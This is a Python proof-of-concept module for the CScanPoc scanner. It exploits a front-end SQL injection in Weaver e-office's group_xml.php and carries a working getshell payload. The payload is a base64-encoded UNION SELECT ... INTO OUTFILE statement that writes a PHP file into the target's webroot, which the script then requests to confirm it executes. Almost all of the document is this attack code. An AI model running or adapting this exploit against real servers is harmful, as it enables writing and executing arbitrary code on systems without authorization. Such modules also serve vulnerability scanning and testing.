# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import base64


class Vuln(ABVuln):
    vuln_id = 'weaver_0042'  # 平台漏洞编号，留空
    name = '泛微e-office getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-07-23'  # 漏洞公布时间
    desc = '''
        泛微 e-office 前台sql注入导致的 getshell.
        inc/group_user_list/group_xml.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f61662e9-cf01-4100-b898-c8b8a1daf0b9'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0128007
            hh = hackhttp.hackhttp()
            arg = self.target
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849b'
            filename = 'wtFtw' + str(random.randint(111, 999))+'.php'
            payload = '[group]:[1]|[groupid]:[1 union select 0x3c3f706870206563686f206d64352831293b203f3e,2,3,4,5,6,7,8 into outfile \'../webroot/{filename}\']'.format(
                filename=filename)
            payload = base64.b64encode(payload)
            #print payload
            url = arg + '/inc/group_user_list/group_xml.php?par=' + payload
            code, head, res, err, _ = hh.http(url)

            if code == 200:
                code, head, res, err, _ = hh.http(arg + '/' + filename)
                if (code == 200) and (md5_1 in res):
                    #security_hole('weaver e-office getshell: ' + url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
